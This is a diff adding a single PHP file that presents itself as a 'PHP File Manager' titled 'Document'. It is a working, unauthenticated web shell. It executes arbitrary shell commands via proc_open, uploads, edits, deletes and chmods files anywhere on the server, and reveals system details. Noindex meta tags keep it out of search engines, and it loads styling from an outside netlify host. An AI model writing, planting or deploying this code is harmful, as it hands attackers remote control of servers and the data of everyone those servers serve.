@@ -1,0 +1,351 @@
+<?php
+function getPermissions($file)
+{
+    $perms = fileperms($file);
+    $info = '';
+    $info .= ($perms & 0x0100) ? 'r' : '-';
+    $info .= ($perms & 0x0080) ? 'w' : '-';
+    $info .= ($perms & 0x0040) ? 'x' : '-';
+    $info .= ($perms & 0x0020) ? 'r' : '-';
+    $info .= ($perms & 0x0010) ? 'w' : '-';
+    $info .= ($perms & 0x0008) ? 'x' : '-';
+    $info .= ($perms & 0x0004) ? 'r' : '-';
+    $info .= ($perms & 0x0002) ? 'w' : '-';
+    $info .= ($perms & 0x0001) ? 'x' : '-';
+    return $info;
+}
+
+function ex($coman, $serlok)
+{
+    $command = $coman;
+    if (!preg_match('/2>&1/i', $command)) {
+        $command .= ' 2>&1';
+    }
+
+    if (!function_exists('proc_open')) {
+        return false;
+    }
+
+    $descriptors = array(
+        0 => array('pipe', 'r'),
+        1 => array('pipe', 'w'),
+        2 => array('pipe', 'w')
+    );
+
+    $pipes = array();
+    $process = @proc_open($command, $descriptors, $pipes, $serlok);
+
+    if (!is_resource($process)) {
+        return false;
+    }
+
+    fclose($pipes[0]);
+    $stdout = stream_get_contents($pipes[1]);
+    $stderr = stream_get_contents($pipes[2]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+
+    $exitCode = proc_close($process);
+    $output = trim($stdout . "\n" . $stderr);
+
+    return $output !== '' ? $output : 'Command completed with exit code ' . $exitCode . '.';
+}
+
+$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
+$path = str_replace('\\', '/', $path);
+$paths = explode('/', $path);
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="googlebot" content="noindex">
+    <title>Document</title>
+
+    <link rel="stylesheet" href="https://naxtarrr.netlify.app/assets/css/pfm.css">
+</head>
+
+<body>
+
+    <?php
+    echo '<div class="fm-shell">';
+    echo '<h2><a href="?path=' . dirname($_SERVER["SCRIPT_FILENAME"]) . '">PHP File Manager</a></h2>';
+    echo '<p>OS: ' . php_uname() . '</p>';
+
+    echo '<p>Directory: <span style="overflow-x: auto; display: inline-block; max-width: 100%;">';
+    foreach ($paths as $id => $pat) {
+        if ($pat == '' && $id == 0) {
+            echo '<a href="?path=/">/</a>';
+            continue;
+        }
+        if ($pat == '') continue;
+        echo '<a href="?path=';
+        for ($i = 0; $i <= $id; $i++) {
+            echo "$paths[$i]";
+            if ($i != $id) echo "/";
+        }
+        echo '">' . htmlspecialchars($pat) . '</a>/';
+    }
+    echo '</span></p>';
+    echo '<a href="?path=' . urlencode($path) . '&command">Command</a> | <a href="?path=' . urlencode($path) . '&newfile">New File</a> | <a href="?path=' . urlencode($path) . '&newdir">New Dir</a>';
+
+    echo '<form enctype="multipart/form-data" method="POST">';
+    echo '<input type="file" name="file" />';
+    echo '<input type="submit" value="Upload" />';
+    echo '<input type="hidden" name="upload_path" value="' . htmlspecialchars($path) . '">';
+    echo '</form>';
+
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+        $uploadPath = $_POST['upload_path'];
+        $uploadFile = $uploadPath . '/' . $_FILES['file']['name'];
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
+            echo "<p class='feedback success'>File uploaded successfully. <a href='?path=" . urlencode($path) . "&edit=" . urlencode($uploadFile) . "'>View</a>.</p>";
+        } else {
+            echo "<p class='feedback error'>File upload failed.</p>";
+        }
+    }
+
+    if (isset($_GET['delete'])) {
+        $deletePath = $_GET['delete'];
+        if (is_file($deletePath)) {
+            if (unlink($deletePath)) {
+                echo "<p class='feedback success'>File deleted successfully.</p>";
+            } else {
+                echo "<p class='feedback error'>Failed to delete file.</p>";
+            }
+        } else {
+            echo "<p class='feedback error'>Failed to delete file.</p>";
+        }
+    }
+
+    if (isset($_GET['path']) && isset($_GET['command'])) {
+        echo '<form method="POST">';
+        echo '<input type="text" name="cmd" value="' . (isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : '') . '" placeholder="Enter command" />';
+        echo '<input type="submit" value="Execute" />';
+        echo '</form>';
+        if (!empty($_POST['cmd'])) {
+            $result = ex($_POST['cmd'], $path);
+            echo '<pre>' . htmlspecialchars($result) . '</pre>';
+        }
+    }
+    if (isset($_GET['path']) && isset($_GET['newfile'])) {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
+            $newFilePath = $path . '/' . $_POST['filename'];
+            if (file_put_contents($newFilePath, '') !== false) {
+                echo "<p class='feedback success'>File created successfully. <a href='?path=" . urlencode($path) . "&edit=" . urlencode($newFilePath) . "'>View</a>.</p>";
+            } else {
+                echo "<p class='feedback error'>Failed to create file.</p>";
+            }
+        }
+        echo '<form method="POST">';
+        echo '<input type="text" name="filename" placeholder="Enter new file name" />';
+        echo '<input type="submit" value="Create File" />';
+        echo '</form>';
+    }
+    if (isset($_GET['path']) && isset($_GET['newdir'])) {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['dirname'])) {
+            $newDirPath = $path . '/' . $_POST['dirname'];
+            if (mkdir($newDirPath)) {
+                echo "<p class='feedback success'>Directory created successfully. <a href='?path=" . urlencode($newDirPath) . "'>View</a>.</p>";
+            } else {
+                echo "<p class='feedback error'>Failed to create directory.</p>";
+            }
+        }
+        echo '<form method="POST">';
+        echo '<input type="text" name="dirname" placeholder="Enter new directory name" />';
+        echo '<input type="submit" value="Create Directory" />';
+        echo '</form>';
+    }
+
+    if (isset($_GET['path']) && isset($_GET['edit'])) {
+        $editPath = $_GET['edit'];
+        $content = $_POST['content'];
+        if (is_file($editPath)) {
+            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($content)) {
+                if (file_put_contents($editPath, base64_decode($content))) {
+                    echo "<p class='feedback success'>Edit completed successfully.</p>";
+                } else {
+                    echo "<p class='feedback error'>Edit failed. Please try again.</p>";
+                }
+            }
+            $content = file_get_contents($editPath);
+            echo '<form method="POST" id="handle_file">';
+            echo '<p>File: ' . basename($editPath) . '</p>';
+            echo '<textarea name="content" rows="20" cols="80">' . htmlspecialchars($content) . '</textarea><br>';
+            echo '<input type="submit" value="Save" />';
+            echo '</form>';
+        } else {
+            echo "<p style='color: red;'>File does not exist.</p>";
+        }
+    } else if (isset($_GET['path']) && isset($_GET['rename'])) {
+        $renamePath = $_GET['rename'];
+        if (is_file($renamePath)) {
+            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
+                $newName = $_POST['new_name'];
+                $newPath = dirname($renamePath) . '/' . $newName;
+                if (rename($renamePath, $newPath)) {
+                    echo "<p class='feedback success'>File renamed successfully.</p>";
+                } else {
+                    echo "<p class='feedback error'>Failed to rename file.</p>";
+                }
+            }
+            echo '<form method="POST">';
+            echo '<input type="text" name="new_name" value="' . htmlspecialchars(basename($renamePath)) . '" />';
+            echo '<input type="submit" value="Rename" />';
+            echo '</form>';
+        } else {
+            echo "<p style='color: red;'>File does not exist.</p>";
+        }
+    } else if (isset($_GET['path']) && isset($_GET['chmod'])) {
+        $chmodPath = $_GET['chmod'];
+        if (is_file($chmodPath)) {
+            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permissions'])) {
+                $permissions = octdec($_POST['permissions']);
+                if (chmod($chmodPath, $permissions)) {
+                    echo "<p class='feedback success'>Permissions changed successfully.</p>";
+                } else {
+                    echo "<p class='feedback error'>Failed to change permissions.</p>";
+                }
+            }
+            $currentPerms = substr(sprintf('%o', fileperms($chmodPath)), -4);
+            echo '<form method="POST">';
+            echo '<p>File: ' . basename($chmodPath) . '</p>';
+            echo '<input type="text" name="permissions" value="' . htmlspecialchars($currentPerms) . '" />';
+            echo '<input type="submit" value="Change Permissions" />';
+            echo '</form>';
+        } else {
+            echo "<p style='color: red;'>File does not exist.</p>";
+        }
+    } else if (isset($_GET['path']) && isset($_GET['deletedir'])) {
+        $deleteDirPath = $_GET['deletedir'];
+        if (is_dir($deleteDirPath)) {
+            if (rmdir($deleteDirPath)) {
+                echo "<p class='feedback success'>Directory deleted successfully.</p>";
+            } else {
+                echo "<p class='feedback error'>Failed to delete directory. Make sure it is empty.</p>";
+            }
+        } else {
+            echo "<p class='feedback error'>Directory does not exist.</p>";
+        }
+    } else if (isset($_GET['path']) && isset($_GET['renamedir'])) {
+        $renameDirPath = $_GET['renamedir'];
+        if (is_dir($renameDirPath)) {
+            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
+                $newName = $_POST['new_name'];
+                $newDirPath = dirname($renameDirPath) . '/' . $newName;
+                if (rename($renameDirPath, $newDirPath)) {
+                    echo "<p class='feedback success'>Directory renamed successfully.</p>";
+                } else {
+                    echo "<p class='feedback error'>Failed to rename directory.</p>";
+                }
+            }
+            echo '<form method="POST">';
+            echo '<input type="text" name="new_name" value="' . htmlspecialchars(basename($renameDirPath)) . '" />';
+            echo '<input type="submit" value="Rename Directory" />';
+            echo '</form>';
+        } else {
+            echo "<p style='color: red;'>Directory does not exist.</p>";
+        }
+    } else if (isset($_GET['path']) && isset($_GET['chmoddir'])) {
+        $chmodDirPath = $_GET['chmoddir'];
+        if (is_dir($chmodDirPath)) {
+            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permissions'])) {
+                $permissions = octdec($_POST['permissions']);
+                if (chmod($chmodDirPath, $permissions)) {
+                    echo "<p class='feedback success'>Permissions changed successfully.</p>";
+                } else {
+                    echo "<p class='feedback error'>Failed to change permissions.</p>";
+                }
+            }
+            $currentPerms = substr(sprintf('%o', fileperms($chmodDirPath)), -4);
+            echo '<form method="POST">';
+            echo '<input type="text" name="permissions" value="' . htmlspecialchars($currentPerms) . '" />';
+            echo '<input type="submit" value="Change Permissions" />';
+            echo '</form>';
+        } else {
+            echo "<p style='color: red;'>Directory does not exist.</p>";
+        }
+    }
+
+    $items = array_diff(scandir($path), array('.', '..'));
+    usort($items, function ($a, $b) use ($path) {
+        $aPath = $path . DIRECTORY_SEPARATOR . $a;
+        $bPath = $path . DIRECTORY_SEPARATOR . $b;
+
+        $aIsDir = is_dir($aPath);
+        $bIsDir = is_dir($bPath);
+
+        if ($aIsDir !== $bIsDir) {
+            return $aIsDir ? -1 : 1;
+        }
+
+        return strnatcasecmp($a, $b);
+    });
+
+    echo '<div class="table-wrapper"><table class="file-table">';
+    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Options</th></tr>';
+
+    foreach ($items as $item) {
+        $itemPath = $path . DIRECTORY_SEPARATOR . $item;
+        echo '<tr>';
+        if (is_dir($itemPath)) {
+            echo '<td><a href="?path=' . urlencode($itemPath) . '">' . htmlspecialchars($item) . '</a></td>';
+            echo '<td>--</td>';
+            echo '<td style="' . (is_writable($itemPath) ? 'color: #299214;' : 'color: #d43c3c;') . '">' . getPermissions($itemPath) . '</td>';
+            echo '<td>
+            <a href="?path=' . urlencode($path) . '&renamedir=' . urlencode($itemPath) . '">Rename</a> |
+            <a href="?path=' . urlencode($path) . '&chmoddir=' . urlencode($itemPath) . '">Chmod</a> |
+            <a href="?path=' . urlencode($path) . '&deletedir=' . urlencode($itemPath) . '">Delete</a>
+        </td>';
+        } else {
+            echo '<td>' . htmlspecialchars($item) . '</td>';
+            echo '<td>' . filesize($itemPath) . ' bytes</td>';
+            echo '<td style="' . (is_writable($itemPath) ? 'color: #299214;' : 'color: #d43c3c;') . '">' . getPermissions($itemPath) . '</td>';
+            echo '<td>
+            <a href="?path=' . urlencode($path) . '&edit=' . urlencode($itemPath) . '">Edit</a> |
+            <a href="?path=' . urlencode($path) . '&rename=' . urlencode($itemPath) . '">Rename</a> |
+            <a href="?path=' . urlencode($path) . '&chmod=' . urlencode($itemPath) . '">Chmod</a> |
+            <a href="?path=' . urlencode($path) . '&delete=' . urlencode($itemPath) . '">Delete</a>
+        </td>';
+        }
+        echo '</tr>';
+    }
+
+    echo '</table></div>';
+
+    echo '</div>';
+
+    ?>
+    <script>
+        const edit_form = document.getElementById('handle_file');
+        if (edit_form) {
+            edit_form.addEventListener('submit', async (e) => {
+                const filename = edit_form.querySelector('[type="text"]');
+                const textarea = edit_form.querySelector('textarea');
+
+                if (filename) {
+                    filename.value = filename.value + ".temporary";
+                }
+
+                textarea.value = await largeBase64Encode(textarea.value);
+            });
+        }
+
+        async function largeBase64Encode(str) {
+            const utf8 = new TextEncoder().encode(str);
+            let binary = '';
+            const chunkSize = 0x8000;
+            for (let i = 0; i < utf8.length; i += chunkSize) {
+                const chunk = utf8.subarray(i, i + chunkSize);
+                binary += String.fromCharCode.apply(null, chunk);
+            }
+            return btoa(binary);
+        }
+    </script>
+</body>
+
+</html>
